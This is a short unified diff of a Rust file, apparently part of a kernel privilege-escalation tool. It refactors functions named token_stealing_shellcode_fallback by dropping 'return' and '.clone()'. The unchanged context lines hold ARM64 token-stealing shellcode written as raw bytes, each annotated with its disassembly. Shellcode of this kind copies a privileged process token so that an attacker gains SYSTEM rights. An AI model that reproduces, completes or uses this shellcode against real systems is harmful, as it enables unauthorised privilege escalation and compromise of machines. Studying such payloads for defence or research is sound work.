@@ -34,7 +34,7 @@ fn token_stealing_shellcode_fallback_x86_64() -> [u8; 84] {
 
 #[cfg(target_arch = "aarch64")]
 pub fn token_stealing_shellcode_fallback_arm64() -> [u8; 76] {
-    return concat_bytes!(
+    *concat_bytes!(
         b"\xe0\x07\x3e\xa9", // 0000000000000000: stp x0,x1,[sp,#-0x20]
         b"\xe2\x0f\x3f\xa9", // 0000000000000004: stp x2,x3,[sp,#-0x10]
         b"\x40\xc6\x44\xf9", // 0000000000000008: ldr x0,[xpr,#0x988]
@@ -55,7 +55,6 @@ pub fn token_stealing_shellcode_fallback_arm64() -> [u8; 76] {
         b"\xff\xc3\x00\x91", // 0000000000000044: add sp,sp,#0x30
         b"\xc0\x03\x5f\xd6"  // 0000000000000048: ret
     )
-    .clone();
 }
 
 #[cfg(all(target_arch = "x86_64", feature = "shellcode_fallback"))]
@@ -65,7 +64,7 @@ pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
 
 #[cfg(all(target_arch = "aarch64", feature = "shellcode_fallback"))]
 pub fn token_stealing_shellcode_fallback() -> [u8; 76] {
-    return token_stealing_shellcode_fallback_arm64();
+    token_stealing_shellcode_fallback_arm64()
 }
 
 #[rustfmt::skip]
